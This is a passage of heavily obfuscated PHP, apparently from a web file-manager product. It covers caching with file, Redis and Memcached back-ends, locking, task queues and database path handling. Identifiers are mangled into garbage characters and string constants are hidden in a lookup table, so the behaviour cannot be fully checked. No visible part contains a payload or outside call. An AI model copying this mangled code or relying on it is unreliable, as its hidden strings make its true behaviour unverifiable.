moveBottom($œèô˝Ü⁄) { $ØŒ°¨ÿï =& $_SERVER[Çâä∆◊¡]; $ÜÓ˝†ÄÛ = array($ØŒ°¨ÿï[1633] => USER_ID, $ØŒ°¨ÿï[483] => 0); $ ≥ˆöﬂŒ = $this->where($ÜÓ˝†ÄÛ)->max($ØŒ°¨ÿï[1833]); $¡°∞¬‡Œ = array($ØŒ°¨ÿï[1833] => $ ≥ˆöﬂŒ + 1); return $this->where($ÜÓ˝†ÄÛ)->where(array($ØŒ°¨ÿï[32] => $œèô˝Ü⁄))->save($¡°∞¬‡Œ); } private function getAutoName($ï¶óØÄ¡) { $‡¡ »Àº =& $_SERVER[Çâä∆◊¡]; $∑ê—Ê˛á = array($‡¡ »Àº[1633] => USER_ID, $‡¡ »Àº[483] => 0); $î›¸∆˝÷ = $this->field($‡¡ »Àº[32])->where($∑ê—Ê˛á)->select(); $î›¸∆˝÷ = array_to_keyvalue($î›¸∆˝÷, $‡¡ »Àº[12], $‡¡ »Àº[32]); if (!$î›¸∆˝÷ || !in_array($ï¶óØÄ¡, $î›¸∆˝÷)) { return $ï¶óØÄ¡; } for ($ô–¶∆ã = 0; $ô–¶∆ã < count($î›¸∆˝÷); $ô–¶∆ã++) { if (!in_array($ï¶óØÄ¡ . "\50{$ô–¶∆ã}\51", $î›¸∆˝÷)) { return $ï¶óØÄ¡ . "\50{$ô–¶∆ã}\x29"; } } return $ï¶óØÄ¡ . "\x28{$ô–¶∆ã}\x29"; } } goto F ¢æØ∑ïè; eÊ®ã˜ ë√: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $◊∑ö€Æø =& $_SERVER[Çâä∆◊¡]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Î˜ß≥Û± = $GLOBALS[$◊∑ö€Æø[6]][$◊∑ö€Æø[344]]; $æ≈âÆ´• = $Î˜ß≥Û±[$Î˜ß≥Û±[$◊∑ö€Æø[820]]]; $ﬁÑÍ∂öí = $Î˜ß≥Û±[$◊∑ö€Æø[821]]; switch ($Î˜ß≥Û±[$◊∑ö€Æø[820]]) { case $◊∑ö€Æø[21]: self::$handle = Model($◊∑ö€Æø[822]); break; case $◊∑ö€Æø[823]: self::$handle = new CacheRedis($æ≈âÆ´•, $ﬁÑÍ∂öí); break; case $◊∑ö€Æø[824]: self::$handle = new CacheMemcached($æ≈âÆ´•, $ﬁÑÍ∂öí); break; case $◊∑ö€Æø[192]: self::$handle = new CacheFile($æ≈âÆ´•, $ﬁÑÍ∂öí); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ÃÀ÷ﬁúÃ) { if (is_array($ÃÀ÷ﬁúÃ) || is_object($ÃÀ÷ﬁúÃ)) { $ÃÀ÷ﬁúÃ = json_encode($ÃÀ÷ﬁúÃ); } $ÃÀ÷ﬁúÃ = rawurlencode($ÃÀ÷ﬁúÃ); return md5(KOD_SITE_ID . $_SERVER[Çâä∆◊¡][11] . $ÃÀ÷ﬁúÃ); } public static function get($–Ó˙≠É√, $†±µ·π∆ = false) { $úÀ◊¯Æ∫ = self::key($–Ó˙≠É√); if ($†±µ·π∆) { return unserialize(self::init()->get($úÀ◊¯Æ∫)); } if (!isset(self::$memoryCache[$úÀ◊¯Æ∫])) { $◊ó˝Œ‰ü = self::init()->get($úÀ◊¯Æ∫); self::$memoryCache[$úÀ◊¯Æ∫] = unserialize($◊ó˝Œ‰ü); } return self::$memoryCache[$úÀ◊¯Æ∫]; } public static function set($¸‹Çµµª, $£—éÈÖ˘, $Äﬂ¿«¬‡ = false) { $º£Ÿﬂ‡∏ = self::key($¸‹Çµµª); if (isset(self::$memoryCache[$º£Ÿﬂ‡∏]) && self::$memoryCache[$º£Ÿﬂ‡∏] === $£—éÈÖ˘) { return !0; } if ($Äﬂ¿«¬‡ === 0) { self::$memoryCache[$º£Ÿﬂ‡∏] = $£—éÈÖ˘; return !0; } CacheLock::lock($¸‹Çµµª); $ÀûÄˆÁ∂ = self::init()->set($º£Ÿﬂ‡∏, serialize($£—éÈÖ˘), $Äﬂ¿«¬‡); self::$memoryCache[$º£Ÿﬂ‡∏] = $£—éÈÖ˘; CacheLock::unlock($¸‹Çµµª); return $ÀûÄˆÁ∂; } public static function getCall($íÿ’ﬁ£≤, $Ö•¢Ñ’˙, $øΩâ¥å§, $ô»ÔÌ©∆ = array()) { $Åö¢≈âì =& $_SERVER[Çâä∆◊¡]; $Àë·ÃÉ = self::get($íÿ’ﬁ£≤); if ($Àë·ÃÉ || $Àë·ÃÉ === $Åö¢≈âì[12]) { return $Àë·ÃÉ; } $Àë·ÃÉ = call_user_func_array($øΩâ¥å§, $ô»ÔÌ©∆); $Àë·ÃÉ = $Àë·ÃÉ ? $Àë·ÃÉ : $Åö¢≈âì[12]; self::set($íÿ’ﬁ£≤, $Àë·ÃÉ, $Ö•¢Ñ’˙); return $Àë·ÃÉ; } public static function remove($çê≤ÿŸß) { $…–πË§ô = self::key($çê≤ÿŸß); unset(self::$memoryCache[$…–πË§ô]); self::clearTimeout(); CacheLock::lock($çê≤ÿŸß); $≈ıÄ”ìÑ = self::init()->remove($…–πË§ô); CacheLock::unlock($çê≤ÿŸß); return $≈ıÄ”ìÑ; } public static function removeMemory($‡≤Ò™±≥) { $ °©æ∫ê = self::key($‡≤Ò™±≥); unset(self::$memoryCache[$ °©æ∫ê]); } public static function clearMemory($¯¶œ¸ªù = false) { if ($¯¶œ¸ªù) { $¯¶œ¸ªù = self::key($¯¶œ¸ªù); unset(self::$memoryCache[$¯¶œ¸ªù]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Çâä∆◊¡][825])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Çâä∆◊¡][826])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¢éÃø, $´Ê»ì©À) { $áÆÿú‰Ã =& $_SERVER[Çâä∆◊¡]; $this->cachePath = $¢éÃø[$áÆÿú‰Ã[78]]; $this->prefix = $áÆÿú‰Ã[827]; $this->cacheTime = $´Ê»ì©À; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($çõ√´◊∏) { $˙º¡–ÛÌ =& $_SERVER[Çâä∆◊¡]; $çõ√´◊∏ = str_replace(array($˙º¡–ÛÌ[828], $˙º¡–ÛÌ[98], $˙º¡–ÛÌ[73]), $˙º¡–ÛÌ[829], $çõ√´◊∏); return $this->cachePath . $˙º¡–ÛÌ[830] . $çõ√´◊∏ . $˙º¡–ÛÌ[831]; } public function set($˜Æ¯Æ‰, $Œë˚›¥Ÿ, $Õ¸æâ‹π = false) { $á˜˜ù¨› = $this->getFile($˜Æ¯Æ‰); if (file_put_contents($á˜˜ù¨›, $this->prefix . $Œë˚›¥Ÿ, LOCK_EX)) { @touch($á˜˜ù¨›, intval(time() + $Õ¸æâ‹π)); clearstatcache(); return !0; } @unlink($á˜˜ù¨›); return !1; } public function get($ßﬂﬂ»Ïë) { $¿À‘¸¬© = $this->getFile($ßﬂﬂ»Ïë); if (file_exists($¿À‘¸¬©) && filemtime($¿À‘¸¬©) < time()) { @unlink($¿À‘¸¬©); return !1; } $¯üœ‚ÔÊ = @file_get_contents($¿À‘¸¬©); return substr($¯üœ‚ÔÊ, strlen($this->prefix)); } public function remove($´∞ÁõêÔ) { $‚ÉôõâË = $this->getFile($´∞ÁõêÔ); return @unlink($‚ÉôõâË); } public function deleteAll() { $°û¢˘¶ø =& $_SERVER[Çâä∆◊¡]; $“ó∫˜Õá = scandir($this->cachePath); foreach ($“ó∫˜Õá as $ŸÜ™ÙÂ¸) { $Õ⁄≈ñüﬂ = $this->cachePath . $ŸÜ™ÙÂ¸; if (strpos($Õ⁄≈ñüﬂ, $°û¢˘¶ø[831]) && strpos($Õ⁄≈ñüﬂ, $°û¢˘¶ø[832])) { @unlink($Õ⁄≈ñüﬂ); } } } public function clearTimeout() { $æÈ≠Ì’É =& $_SERVER[Çâä∆◊¡]; $çáú£Áπ = scandir($this->cachePath); foreach ($çáú£Áπ as $‚ÓŸø∂) { $¢î”Ô˘Î = $this->cachePath . $‚ÓŸø∂; if (strpos($¢î”Ô˘Î, $æÈ≠Ì’É[831]) && strpos($¢î”Ô˘Î, $æÈ≠Ì’É[832]) && filemtime($¢î”Ô˘Î) < time()) { @unlink($¢î”Ô˘Î); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ºÎ¡ƒØ‚ =& $_SERVER[Çâä∆◊¡]; if (self::$handle) { return self::$handle; } $èúòπ‘á = $GLOBALS[$ºÎ¡ƒØ‚[6]][$ºÎ¡ƒØ‚[344]]; self::$timeout = $èúòπ‘á[$ºÎ¡ƒØ‚[833]] ? $èúòπ‘á[$ºÎ¡ƒØ‚[833]] : 10; $óî—Ç∆ï = _get($GLOBALS[$ºÎ¡ƒØ‚[6]], $ºÎ¡ƒØ‚[834]); $Û∆ªÅ§¬ = $èúòπ‘á[$ºÎ¡ƒØ‚[820]] ? $èúòπ‘á[$ºÎ¡ƒØ‚[820]] : $ºÎ¡ƒØ‚[192]; if ($Û∆ªÅ§¬ == $ºÎ¡ƒØ‚[21] && $óî—Ç∆ï == $ºÎ¡ƒØ‚[13]) { $Û∆ªÅ§¬ = $ºÎ¡ƒØ‚[192]; } switch ($Û∆ªÅ§¬) { case $ºÎ¡ƒØ‚[823]: self::$handle = new CacheLockRedis(); break; case $ºÎ¡ƒØ‚[824]: self::$handle = new CacheLockMemcached(); break; case $ºÎ¡ƒØ‚[21]: self::$handle = new CacheLockDatabase(); break; case $ºÎ¡ƒØ‚[192]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ºÎ¡ƒØ‚[835], $ºÎ¡ƒØ‚[836]); } return self::$handle; } private static function key($≥Ë»Õ‘Ã) { return $_SERVER[Çâä∆◊¡][837] . Cache::key($≥Ë»Õ‘Ã); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¯“ª⁄ê≥ = '') { self::$errorMsg = $¯“ª⁄ê≥; } public static function lockGlobal($ûﬂÎµÃß, $∑Õ†ÇôÓ) { return self::lock($ûﬂÎµÃß, $∑Õ†ÇôÓ, !0); } public static function lock($ö◊õ™¥€, $«≥Ûÿ¿¯ = false, $¬≤ÒäΩò = false) { $£ß≥ÊπÔ =& $_SERVER[Çâä∆◊¡]; $⁄Ó©™å∞ = self::init(); $úå˘…Çç = self::key($ö◊õ™¥€); $«≥Ûÿ¿¯ = $«≥Ûÿ¿¯ ? $«≥Ûÿ¿¯ : self::$timeout; $èËÚ«¿” = $⁄Ó©™å∞->lock($úå˘…Çç, $«≥Ûÿ¿¯); $ª¯±˝ÓÉ = timeFloat(); if (!$èËÚ«¿”) { $ÿ‡Ó¯æ = "\x6c\x6f\143\153\40\x65\x72\x72\x6f\x72\73\153\x65\171\75{$ö◊õ™¥€}\x3b\x74\151\155\145\75{$«≥Ûÿ¿¯}\73" . self::$errorMsg . $£ß≥ÊπÔ[71] . get_caller_msg(); $†Èç– ◊ = LNG($£ß≥ÊπÔ[838]) . "\x28{$«≥Ûÿ¿¯}\163\x29\x2e" . LNG($£ß≥ÊπÔ[839]); $†Èç– ◊ .= $£ß≥ÊπÔ[840]; if (is_string(self::$errorMsg) && self::$errorMsg) { $†Èç– ◊ = $†Èç– ◊ . $£ß≥ÊπÔ[841] . self::$errorMsg; } write_log($ÿ‡Ó¯æ, $£ß≥ÊπÔ[836]); show_json($†Èç– ◊, !1); } if (!$¬≤ÒäΩò) { self::$lockItem[$úå˘…Çç] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $‹¸“–√∏ = number_format(timeFloat() - $ª¯±˝ÓÉ, 3); write_log($£ß≥ÊπÔ[842] . $ö◊õ™¥€ . $£ß≥ÊπÔ[843] . $‹¸“–√∏, $£ß≥ÊπÔ[836]); } return $èËÚ«¿”; } public static function lockGet($±∏ü≈¸Ñ) { $∂›√¯Ωœ = self::key($±∏ü≈¸Ñ); if (self::$lockItem[$∂›√¯Ωœ]) { return self::$lockItem[$∂›√¯Ωœ]; } return self::init()->lockGet($∂›√¯Ωœ); } public static function unlock($ñ›·Õ˝≤) { $ö‡ÂãÊ =& $_SERVER[Çâä∆◊¡]; $∂ü¶˘Ïó = self::key($ñ›·Õ˝≤); self::$lockItem[$∂ü¶˘Ïó] = null; self::init()->unlock($∂ü¶˘Ïó); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ö‡ÂãÊ[844] . $ñ›·Õ˝≤, $ö‡ÂãÊ[836]); } return; } public static function unlockRuntime() { $õëæô´‡ =& $_SERVER[Çâä∆◊¡]; $î∏‘∏íÅ = self::init(); $›ŸËì√± = !1; foreach (self::$lockItem as $∆π◊©ÕÂ => $Í»·¢Âñ) { if (!$Í»·¢Âñ) { continue; } $î∏‘∏íÅ->unlock($∆π◊©ÕÂ); if (!$›ŸËì√±) { $›ŸËì√± = !0; write_log($õëæô´‡[845] . $∆π◊©ÕÂ . $õëæô´‡[71] . get_caller_msg(), $õëæô´‡[836]); continue; } write_log($õëæô´‡[845] . $∆π◊©ÕÂ, $õëæô´‡[836]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $≈ÕπÁ˚˛ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($õëæô´‡[846] . $≈ÕπÁ˚˛ . $õëæô´‡[847] . ACTION, $õëæô´‡[836]); } } public static function fileLock($Ï¥ÔàΩ⁄) { $ﬂÅóåÆ◊ =& $_SERVER[Çâä∆◊¡]; if (!$GLOBALS[$ﬂÅóåÆ◊[848]]) { $GLOBALS[$ﬂÅóåÆ◊[848]] = array(); } $GLOBALS[$ﬂÅóåÆ◊[848]][$Ï¥ÔàΩ⁄] = !1; $Åè” ¿Ê = fopen(DATA_PATH . $Ï¥ÔàΩ⁄ . $ﬂÅóåÆ◊[849], $ﬂÅóåÆ◊[850]); if (!$Åè” ¿Ê) { return !1; } $GLOBALS[$ﬂÅóåÆ◊[848]][$Ï¥ÔàΩ⁄] = $Åè” ¿Ê; if (flock($Åè” ¿Ê, LOCK_EX)) { return !0; } self::unlock($Ï¥ÔàΩ⁄); show_json($ﬂÅóåÆ◊[851], !1); return !1; } public static function fileUnlock($◊é†àëæ) { $˛ÆÀ˚àÌ =& $_SERVER[Çâä∆◊¡]; $õ∞»ˆ¯ò = $GLOBALS[$˛ÆÀ˚àÌ[848]][$◊é†àëæ]; if (!$õ∞»ˆ¯ò) { return; } $GLOBALS[$˛ÆÀ˚àÌ[848]][$◊é†àëæ] = !1; flock($õ∞»ˆ¯ò, LOCK_UN); fclose($õ∞»ˆ¯ò); } public static function fileUnlockAll() { $ı◊ÎÏôè =& $_SERVER[Çâä∆◊¡]; if (!$GLOBALS[$ı◊ÎÏôè[848]]) { return; } foreach ($GLOBALS[$ı◊ÎÏôè[848]] as $œ∂©óçÚ => $¢¢ä€¢∂) { if (!$¢¢ä€¢∂) { continue; } $GLOBALS[$ı◊ÎÏôè[848]][$œ∂©óçÚ] = !1; flock($¢¢ä€¢∂, LOCK_UN); fclose($¢¢ä€¢∂); } $GLOBALS[$ı◊ÎÏôè[848]] = array(); } } goto b’±‰±¬˘˘; eß·œÖˆü´: class TaskHttp extends Task { protected function startAfter() { $èÆ¡‰ñª =& $_SERVER[Çâä∆◊¡]; $„ÑÄù√ =& $this->task; $„ÑÄù√[$èÆ¡‰ñª[1713]] = 1; Hook::bind($èÆ¡‰ñª[1682], array($this, $èÆ¡‰ñª[1714])); Hook::bind($èÆ¡‰ñª[1684], array($this, $èÆ¡‰ñª[1715])); Hook::bind($èÆ¡‰ñª[1686], array($this, $èÆ¡‰ñª[1716])); } protected function endAfter() { $ÆÏÙãìÊ =& $_SERVER[Çâä∆◊¡]; Hook::unbind($ÆÏÙãìÊ[1682], array($this, $ÆÏÙãìÊ[1714])); Hook::unbind($ÆÏÙãìÊ[1684], array($this, $ÆÏÙãìÊ[1715])); Hook::unbind($ÆÏÙãìÊ[1686], array($this, $ÆÏÙãìÊ[1716])); } public function progressStart($ÿÔæ¨·Ò) { $¨ß¸ –≠ =& $_SERVER[Çâä∆◊¡]; $Ï‰¸≈êÙ = curl_getinfo($ÿÔæ¨·Ò); self::log($¨ß¸ –≠[1717] . $Ï‰¸≈êÙ[$¨ß¸ –≠[302]]); self::valueSet($this->task[$¨ß¸ –≠[401]], $this->task); } public function progressEnd($∂À¬êÑ) { $Ô“†Â¸Ö =& $_SERVER[Çâä∆◊¡]; self::log($Ô“†Â¸Ö[1718] . $this->task[$Ô“†Â¸Ö[401]]); $this->end(); } public function progress($èÑèä˚ﬂ, $å»·ﬁµà, $Œ“¿’Çÿ, $◊ëäÎﬁë, $‰‚‘∏Ïá) { $£ü¯›“ =& $_SERVER[Çâä∆◊¡]; $ú‹˝»ñ€ =& $this->task; if ($‰‚‘∏Ïá > 0) { $ú‹˝»ñ€[$£ü¯›“[779]] = $ú‹˝»ñ€[$£ü¯›“[779]] == 0 ? $◊ëäÎﬁë : $ú‹˝»ñ€[$£ü¯›“[779]]; $ú‹˝»ñ€[$£ü¯›“[1643]] = $‰‚‘∏Ïá; } else { if ($Œ“¿’Çÿ > 0) { $ú‹˝»ñ€[$£ü¯›“[779]] = $ú‹˝»ñ€[$£ü¯›“[779]] == 0 ? $å»·ﬁµà : $ú‹˝»ñ€[$£ü¯›“[779]]; $ú‹˝»ñ€[$£ü¯›“[1643]] = $Œ“¿’Çÿ; } } $this->update(); self::log("\x70\162\157\x67\x72\x65\163\163\110\x74\x74\160\72\144\x6f\167\x6e\72{$Œ“¿’Çÿ}\57{$å»·ﬁµà}\x3b\40\x75\160\x6c\x6f\141\x64\72{$‰‚‘∏Ïá}\x2f{$◊ëäÎﬁë}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\121\165\145\165\145\x4c\x65\x6e\x67\164\150"; const QUEUE_DATA = "\164\141\163\153\121\x75\x65\x75\x65\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($£õ“°Ìá, $¨“‚⁄Àë = array(), $π≤´Æﬁû = '', $≈†˜¿ÄΩ = '') { $ÉúóÏò° =& $_SERVER[Çâä∆◊¡]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($≈†˜¿ÄΩ && array_find_by_field(self::$listData, $ÉúóÏò°[95], $≈†˜¿ÄΩ)) { return !0; } self::$listData[] = array($ÉúóÏò°[259] => $£õ“°Ìá, $ÉúóÏò°[1719] => $¨“‚⁄Àë, $ÉúóÏò°[451] => $π≤´Æﬁû, $ÉúóÏò°[95] => $≈†˜¿ÄΩ); return !0; } public static function addSubmit() { $˘‡—˜∫Ω =& $_SERVER[Çâä∆◊¡]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($˘‡—˜∫Ω[1720] . json_encode_force(array_to_keyvalue(self::$listData, $˘‡—˜∫Ω[12], $˘‡—˜∫Ω[451])), $˘‡—˜∫Ω[1721]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($øÄƒ¶ﬁ‰, $≠»õÇºæ = array(), $ﬂ©êÖÁÙ = '', $…◊Ä≥“Æ = '') { $≥¥õ∑Æí =& $_SERVER[Çâä∆◊¡]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ú»…πí´ = self::getAll(); if ($…◊Ä≥“Æ && array_find_by_field($Ú»…πí´, $≥¥õ∑Æí[95], $…◊Ä≥“Æ)) { return !0; } $Ú»…πí´[] = array($≥¥õ∑Æí[259] => $øÄƒ¶ﬁ‰, $≥¥õ∑Æí[1719] => $≠»õÇºæ, $≥¥õ∑Æí[451] => $ﬂ©êÖÁÙ, $≥¥õ∑Æí[95] => $…◊Ä≥“Æ); write_log($≥¥õ∑Æí[1720] . $ﬂ©êÖÁÙ, $≥¥õ∑Æí[1721]); self::setAll($Ú»…πí´); return !0; } public static function run() { $‡ï”ä∏“ =& $_SERVER[Çâä∆◊¡]; $Æﬂ¶‚ö≠ = self::getAll(); $è£–ì∑ = array_shift($Æﬂ¶‚ö≠); if (!$è£–ì∑) { return !1; } self::setAll($Æﬂ¶‚ö≠); $ƒ∏üÛïî = timeFloat(); try { Hook::apply($è£–ì∑[$‡ï”ä∏“[259]], $è£–ì∑[$‡ï”ä∏“[1719]]); } catch (Exception $‰ÚÌßÜ”) { } $˛¨Ö–ôá = number_format(timeFloat() - $ƒ∏üÛïî, 3) . $‡ï”ä∏“[1658]; write_log($‡ï”ä∏“[1722] . $è£–ì∑[$‡ï”ä∏“[451]] . $‡ï”ä∏“[1723] . $˛¨Ö–ôá, $‡ï”ä∏“[1721]); return !0; } public static function count() { $·¿»∂œÄ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$·¿»∂œÄ) { return 0; } return intval($·¿»∂œÄ); } public static function getAll() { $Ëâ÷öÁ› = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$Ëâ÷öÁ›) { return array(); } return $Ëâ÷öÁ›; } public static function setAll($ãÔÍ‡ºÇ) { $å°ºΩ‚Æ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ãÔÍ‡ºÇ), $å°ºΩ‚Æ); Cache::set(self::QUEUE_DATA, $ãÔÍ‡ºÇ, $å°ºΩ‚Æ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($œ¯áµçﬂ, $ï±ﬂÂ ∆ = 5.0) { if (!$œ¯áµçﬂ) { return; } $Ø∆ºÈ˜˜ = Cache::get($œ¯áµçﬂ); if (!$Ø∆ºÈ˜˜ || timeFloat() - floatVal($Ø∆ºÈ˜˜) >= $ï±ﬂÂ ∆) { Cache::set($œ¯áµçﬂ, timeFloat(), $ï±ﬂÂ ∆ * 10); return !0; } return !1; } public static function timeLimitCall($”ÒÚ•ıÏ, $ΩÖü¯àï, $Ÿèˆ⁄û§, $ŒËâÜ”ï = 5.0) { $ÙÌË‰€Ñ =& $_SERVER[Çâä∆◊¡]; if (!$”ÒÚ•ıÏ || !$ΩÖü¯àï) { return; } self::$asyncAdd = !0; $ó¸¢Â†Û = $ÙÌË‰€Ñ[1724]; $íÑßüº‘ = Cache::get($ó¸¢Â†Û, !0); $í©®˜≈è = array($ÙÌË‰€Ñ[1725] => timeFloat(), $ÙÌË‰€Ñ[1726] => timeFloat(), $ÙÌË‰€Ñ[259] => $ΩÖü¯àï, $ÙÌË‰€Ñ[1719] => $Ÿèˆ⁄û§, $ÙÌË‰€Ñ[196] => $ŒËâÜ”ï); if (is_array($íÑßüº‘[$”ÒÚ•ıÏ])) { $í©®˜≈è[$ÙÌË‰€Ñ[1726]] = $íÑßüº‘[$”ÒÚ•ıÏ][$ÙÌË‰€Ñ[1726]]; } if (is_array($íÑßüº‘[$”ÒÚ•ıÏ])) { if (timeFloat() - $íÑßüº‘[$”ÒÚ•ıÏ][$ÙÌË‰€Ñ[1725]] < $í©®˜≈è[$ÙÌË‰€Ñ[196]] * 0.3) { return; } $í©®˜≈è[$ÙÌË‰€Ñ[1726]] = $íÑßüº‘[$”ÒÚ•ıÏ][$ÙÌË‰€Ñ[1726]]; } $íÑßüº‘[$”ÒÚ•ıÏ] = $í©®˜≈è; Cache::set($ó¸¢Â†Û, $íÑßüº‘, 60); Cache::removeMemory($ó¸¢Â†Û); write_log($ÙÌË‰€Ñ[1727] . $”ÒÚ•ıÏ . $ÙÌË‰€Ñ[71] . $ΩÖü¯àï, $ÙÌË‰€Ñ[1721]); } public static function timeLimitCallLoop() { $€˚πÃ–∫ =& $_SERVER[Çâä∆◊¡]; $ì≠„ß¿ı = array($€˚πÃ–∫[1728]); $∞òËôá = in_array(strtolower(ACTION), $ì≠„ß¿ı); if (!$∞òËôá && !self::$asyncAdd) { return; } $ç«ÃÜ¢ = $€˚πÃ–∫[1724]; $„’≤√ŸÑ = Cache::get($ç«ÃÜ¢, !0); if (!$„’≤√ŸÑ || count($„’≤√ŸÑ) <= 0) { return; } $ÅøÇ¡øÑ = !1; $ë†ìÈ¥ú = timeFloat(); $¶—ëˆ§Ì = array(); foreach ($„’≤√ŸÑ as $ê£¡ü°´ => $µ¢Î∏µ÷) { if ($ë†ìÈ¥ú - $µ¢Î∏µ÷[$€˚πÃ–∫[1726]] > $µ¢Î∏µ÷[$€˚πÃ–∫[196]]) { $ÅøÇ¡øÑ = !0; try { Hook::apply($µ¢Î∏µ÷[$€˚πÃ–∫[259]], $µ¢Î∏µ÷[$€˚πÃ–∫[1719]]); write_log($€˚πÃ–∫[1729] . $ê£¡ü°´ . $€˚πÃ–∫[71] . $µ¢Î∏µ÷[$€˚πÃ–∫[259]] . $€˚πÃ–∫[1730] . ACTION, $€˚πÃ–∫[1721]); } catch (Exception $£‘ÕØÑÓ) { } continue; } $¶—ëˆ§Ì[$ê£¡ü°´] = $µ¢Î∏µ÷; } if (!$ÅøÇ¡øÑ) { return; } if (!$¶—ëˆ§Ì) { return Cache::remove($ç«ÃÜ¢); } Cache::set($ç«ÃÜ¢, $¶—ëˆ§Ì, 60); Cache::removeMemory($ç«ÃÜ¢); } public static function finished($¥Ó”ƒø∑, $‹‚¯±—±) { $Íµ∞´Ì‰ =& $_SERVER[Çâä∆◊¡]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Íµ∞´Ì‰[259] => $¥Ó”ƒø∑, $Íµ∞´Ì‰[1719] => $‹‚¯±—±); } private static function finishedRun() { $¡Áô®±— =& $_SERVER[Çâä∆◊¡]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ﬂ™è°“ò) { try { Hook::apply($ﬂ™è°“ò[$¡Áô®±—[259]], $ﬂ™è°“ò[$¡Áô®±—[1719]]); } catch (Exception $Ê˜£≤£À) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto Càäõ”ÕÁ“; DÈà€ÂÏù€: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¢øÙÈ∆ú) { $this->pathParse = $¢øÙÈ∆ú; $this->model = Model($_SERVER[Çâä∆◊¡][1312]); } public function getPath($õƒ‡ı£∂) { return trim($õƒ‡ı£∂, $_SERVER[Çâä∆◊¡][8]); } public function pathFather($Î∑Åµ˘§) { $Ï›êÀÚè = $this->parse($Î∑Åµ˘§); $Ï›êÀÚè = $this->infoSimple($Î∑Åµ˘§); return $Ï›êÀÚè ? $Ï›êÀÚè[$_SERVER[Çâä∆◊¡][498]] : !1; } public function pathThis($ ∆µ„û±) { $ÕáÍø≠Ò = $this->infoSimple($ ∆µ„û±); return $ÕáÍø≠Ò ? $ÕáÍø≠Ò[$_SERVER[Çâä∆◊¡][32]] : !1; } public function getPathOuter($æÀÅ¿«Ì) { if (!$æÀÅ¿«Ì) { return $æÀÅ¿«Ì; } $√ë‰ã¨ü = $this->parse($æÀÅ¿«Ì); return KodIO::make($√ë‰ã¨ü[$_SERVER[Çâä∆◊¡][401]]); } public function copyFolderFromIO($˚¥Å¯‹à, $ìñ€ù‚, $ÿí›∑“⁄, $”∑ù∫ ∑, $é‘–ÓöÜ) { $‘Öèì‘ë = $this->model->copyFolderFromIO($˚¥Å¯‹à, $ìñ€ù‚, $ÿí›∑“⁄, $”∑ù∫ ∑, $é‘–ÓöÜ); return KodIO::make($‘Öèì‘ë); } public function isParentOf($Ï–ã÷•¬, $£à úØ÷) { return $this->model->isParentOf($Ï–ã÷•¬, $£à úØ÷); } public function mkfile($®πÊ–’˚, $Œõì„Õã = '', $Ì†∂â˚˜ = REPEAT_RENAME) { $Öªì£ö€ =& $_SERVER[Çâä∆◊¡]; $„Ÿ˜€´€ = $this->parse($®πÊ–’˚); $®πÊ–’˚ = $„Ÿ˜€´€[$Öªì£ö€[401]]; for ($ê†–ÀÓÖ = 0; $ê†–ÀÓÖ < count($„Ÿ˜€´€[$Öªì£ö€[1313]]); $ê†–ÀÓÖ++) { $„êñÿ˙‹ = $„Ÿ˜€´€[$Öªì£ö€[1313]][$ê†–ÀÓÖ]; if ($ê†–ÀÓÖ == count($„Ÿ˜€´€[$Öªì£ö€[1313]]) - 1) { $®πÊ–’˚ = $this->model->mkfile($®πÊ–’˚, $„êñÿ˙‹, $Œõì„Õã, $Ì†∂â˚˜); break; } $®πÊ–’˚ = $this->model->mkdir($®πÊ–’˚, $„êñÿ˙‹, REPEAT_SKIP); } return $this->getPathOuter($®πÊ–’˚); } public function mkdir($€ÌªÁ‡ó, $ªµ∫òÖ· = REPEAT_SKIP) { $ÛèŸ¬≤€ =& $_SERVER[Çâä∆◊¡]; $„òﬁ¨πø = $this->parse($€ÌªÁ‡ó); $€ÌªÁ‡ó = $„òﬁ¨πø[$ÛèŸ¬≤€[401]]; for ($Ÿ© ºœ® = 0; $Ÿ© ºœ® < count($„òﬁ¨πø[$ÛèŸ¬≤€[1313]]); $Ÿ© ºœ®++) { $Õöﬁò»õ = $„òﬁ¨πø[$ÛèŸ¬≤€[1313]][$Ÿ© ºœ®]; $€ÌªÁ‡ó = $this->model->mkdir($€ÌªÁ‡ó, $Õöﬁò»õ, $ªµ∫òÖ·); } return $this->getPathOuter($€ÌªÁ‡ó); } public function copyFile($˝çßπÍØ, $òƒÂîÔÓ, $ÓªèÓ÷≈ = REPEAT_REPLACE) { $ôïÄ√ﬂä =& 